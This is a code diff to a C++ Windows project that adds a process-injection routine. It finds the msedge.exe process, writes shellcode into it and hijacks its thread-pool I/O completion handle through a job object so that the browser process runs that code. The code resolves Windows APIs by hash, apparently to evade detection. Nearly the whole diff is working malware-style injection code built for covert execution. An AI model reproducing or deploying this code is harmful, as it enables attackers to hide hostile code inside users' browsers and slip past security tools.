@@ -2,6 +2,11 @@
 #include "CRT.h"
 #include "HashString.h"
 #include "ApiResolve.h"
+#include <Windows.h>
+#include <TlHelp32.h>
+#include <iostream>
+#include <vector>
+#pragma comment(lib, "dbghelp.lib")
 
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
 
@@ -132,4 +137,225 @@ bool MappingShellcode(_In_ HANDLE hTargetProcess, _In_ LPVOID lpShellcode, _In_ 
 	}
 
 	return true;
+}
+
+
+HANDLE GetProcHandlebyName(LPWSTR procName) {
+	PROCESSENTRY32W entry;
+	ApiResolve apiResolve;
+	entry.dwSize = sizeof(PROCESSENTRY32W);
+	NTSTATUS status = NULL;
+	HANDLE hProc = 0;
+
+	constexpr unsigned int hashKernel32 = ComplexHashForWChar(L"kernel32.dll");
+	LPVOID lpKernel32 = apiResolve.GetModuleBaseAddress(hashKernel32);
+	if (!lpKernel32) {
+		return NULL;
+	}
+
+	constexpr unsigned int hashCreateToolhelp32Snapshot = ComplexHashForAnsi("CreateToolhelp32Snapshot");
+	typedef HANDLE(WINAPI* _CreateToolhelp32Snapshot)(
+		DWORD dwFlags,
+		DWORD th32ProcessID
+		);
+	_CreateToolhelp32Snapshot pCreateToolhelp32Snapshot = (_CreateToolhelp32Snapshot)apiResolve.GetApiAddress(lpKernel32, hashCreateToolhelp32Snapshot);
+	if (!pCreateToolhelp32Snapshot) {
+		return NULL;
+	}
+
+	HANDLE snapshot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+	if (!snapshot) {
+		return NULL;
+	}
+
+	constexpr unsigned int hashProcess32FirstW = ComplexHashForAnsi("Process32FirstW");
+	typedef BOOL(WINAPI* _Process32FirstW)(
+		HANDLE           hSnapshot,
+		LPPROCESSENTRY32W lppe
+		);
+	_Process32FirstW pProcess32FirstW = (_Process32FirstW)apiResolve.GetApiAddress(lpKernel32, hashProcess32FirstW);
+	if (!pProcess32FirstW) {
+		return NULL;
+	}
+
+	constexpr unsigned int hashProcess32NextW = ComplexHashForAnsi("Process32NextW");
+	typedef BOOL(WINAPI* _Process32NextW)(
+		HANDLE            hSnapshot,
+		LPPROCESSENTRY32W lppe
+		);
+
+	_Process32NextW pProcess32NextW = (_Process32NextW)apiResolve.GetApiAddress(lpKernel32, hashProcess32NextW);
+	if (!pProcess32NextW) {
+		return NULL;
+	}
+
+	if (pProcess32FirstW(snapshot, &entry)) {
+		do {
+			if (wcscmp((entry.szExeFile), procName) == 0) {
+				typedef HANDLE(WINAPI* _OpenProcess)(
+					DWORD dwDesiredAccess,
+					BOOL  bInheritHandle,
+					DWORD dwProcessId
+					);
+				constexpr unsigned int hashOpenProcess = ComplexHashForAnsi("OpenProcess");
+				_OpenProcess pOpenProcess = (_OpenProcess)apiResolve.GetApiAddress(lpKernel32, hashOpenProcess);
+				if (!pOpenProcess) {
+					return NULL;
+				}
+
+				hProc = pOpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, entry.th32ProcessID);
+				if (!hProc) { continue; }
+				return hProc;
+			}
+		} while (pProcess32NextW(snapshot, &entry));
+	}
+
+	return NULL;
+}
+
+bool RemoteTpJobInsertion(LPVOID lpShellcode, DWORD dwShellSize) {
+	ApiResolve apiResolve;
+	SIZE_T byteWritten;
+	constexpr unsigned int hashNtdll = ComplexHashForWChar(L"ntdll.dll");
+	LPVOID hNtdll = apiResolve.GetModuleBaseAddress(hashNtdll);
+	LPHANDLE pDuplicateHandle = new HANDLE;
+	DWORD PID = 0;
+	HANDLE hProc = GetProcHandlebyName((LPWSTR)L"msedge.exe");
+	if (!hProc) {
+		return false;
+	}
+
+	LPVOID lpRemoteAddr = nullptr;
+	if (!MappingShellcode(hProc, lpShellcode, dwShellSize, &lpRemoteAddr, PAGE_EXECUTE_READ)) {
+		VirtualFree(lpShellcode, 0, MEM_RELEASE);
+		CloseHandle(hProc);
+		return false;
+	}
+
+	std::cout << "Mapping success" << std::endl;
+	std::cout << "Shellsize: " << dwShellSize << std::endl;
+
+	NTSTATUS ntStatus;
+	std::vector<BYTE> information;
+	ULONG returnLength = 0;
+	typedef NTSTATUS(
+		NTAPI*
+		_NtQueryInformationProcess)(
+			IN HANDLE ProcessHandle,
+			IN PROCESSINFOCLASS ProcessInformationClass,
+			OUT PVOID ProcessInformation,
+			IN ULONG ProcessInformationLength,
+			OUT PULONG ReturnLength OPTIONAL
+			);
+	constexpr unsigned int hashNtQueryInformationProcess = ComplexHashForAnsi("NtQueryInformationProcess");
+	_NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)apiResolve.GetApiAddress(hNtdll, hashNtQueryInformationProcess);
+	if (!pNtQueryInformationProcess) {
+		std::cout << "NtQueryInformationProcess" << std::endl;
+		return false;
+	}
+
+	do {
+		information.resize(returnLength);
+		ntStatus =
+			pNtQueryInformationProcess(
+				hProc,
+				static_cast<PROCESSINFOCLASS>(ProcessHandleInformation),
+				information.data(),
+				returnLength,
+				&returnLength
+			);
+		//STATUS_INFO_LENGTH_MISMATCH
+	} while (ntStatus == 0xC0000004);
+
+	PPROCESS_HANDLE_SNAPSHOT_INFORMATION pProcessInformation = reinterpret_cast<PPROCESS_HANDLE_SNAPSHOT_INFORMATION>(information.data());
+
+	for (int i = 0; i < pProcessInformation->NumberOfHandles; i++) {
+		HANDLE tmp = pProcessInformation->Handles[i].HandleValue;
+		if (!DuplicateHandle(
+			hProc,
+			pProcessInformation->Handles[i].HandleValue,
+			GetCurrentProcess(),
+			pDuplicateHandle,
+			IO_COMPLETION_ALL_ACCESS,
+			FALSE,
+			NULL
+		)) {
+			continue;
+		}
+
+		std::vector<BYTE> object;
+		returnLength = 0;
+		typedef NTSTATUS
+		(NTAPI* _NtQueryObject)(
+			_In_opt_ HANDLE Handle,
+			_In_ OBJECT_INFORMATION_CLASS ObjectInformationClass,
+			_Out_writes_bytes_opt_(ObjectInformationLength) PVOID ObjectInformation,
+			_In_ ULONG ObjectInformationLength,
+			_Out_opt_ PULONG ReturnLength
+			);
+
+		constexpr unsigned int hashNtQueryObject = ComplexHashForAnsi("NtQueryObject");
+		_NtQueryObject pNtQueryObject = (_NtQueryObject)apiResolve.GetApiAddress(hNtdll, hashNtQueryObject);
+		if (!pNtQueryObject) {
+			return false;
+		}
+
+		do {
+			object.resize(returnLength);
+			ntStatus =
+				pNtQueryObject(
+					*pDuplicateHandle,
+					static_cast<OBJECT_INFORMATION_CLASS>(ObjectTypeInformation),
+					object.data(),
+					returnLength,
+					&returnLength);
+		} while (ntStatus == 0xC0000004);
+		PPUBLIC_OBJECT_TYPE_INFORMATION pObjectInformation = reinterpret_cast<PPUBLIC_OBJECT_TYPE_INFORMATION>(object.data());
+		if (std::wstring(pObjectInformation->TypeName.Buffer) == L"IoCompletion") {
+			break;
+		}
+	}
+
+	HANDLE hJob = CreateJobObjectW(nullptr, const_cast<LPWSTR>(POOL_PARTY_JOB_NAME));
+
+	PFULL_TP_JOB pTpJob = { 0 };
+	typedef NTSTATUS(NTAPI* _TpAllocJobNotification)(
+		_Out_ PFULL_TP_JOB* JobReturn,
+		_In_ HANDLE HJob,
+		_In_ PVOID Callback,
+		_Inout_opt_ PVOID Context,
+		_In_opt_ PTP_CALLBACK_ENVIRON CallbackEnviron
+		);
+
+	constexpr unsigned int hashTpAllocJobNotification = ComplexHashForAnsi("TpAllocJobNotification");
+	_TpAllocJobNotification pTpAllocJobNotification = (_TpAllocJobNotification)apiResolve.GetApiAddress(hNtdll, hashTpAllocJobNotification);
+	if (!pTpAllocJobNotification) {
+		return false;
+	}
+
+	const auto Ntstatus = pTpAllocJobNotification(&pTpJob, hJob, lpRemoteAddr, nullptr, nullptr);
+
+	if (!NT_SUCCESS(Ntstatus))
+	{
+		return false;
+	}
+
+	LPVOID RemoteTpJobAddress = nullptr;
+	DWORD size = sizeof(FULL_TP_JOB) + 1;
+	if (!MappingShellcode(hProc, pTpJob, size, &RemoteTpJobAddress, PAGE_READWRITE)) {
+		return false;
+	}
+
+	JOBOBJECT_ASSOCIATE_COMPLETION_PORT JobAssociateCopmletionPort{ 0 };
+	SetInformationJobObject(hJob, JobObjectAssociateCompletionPortInformation, &JobAssociateCopmletionPort, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT));
+
+	JobAssociateCopmletionPort.CompletionKey = RemoteTpJobAddress;
+	JobAssociateCopmletionPort.CompletionPort = *pDuplicateHandle;
+
+	//std::cout << JobAssociateCopmletionPort.CompletionPort;
+
+	SetInformationJobObject(hJob, JobObjectAssociateCompletionPortInformation, &JobAssociateCopmletionPort, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT));
+
+	AssignProcessToJobObject(hJob, GetCurrentProcess());
+	std::cout << "Inject success" << std::endl;
 }
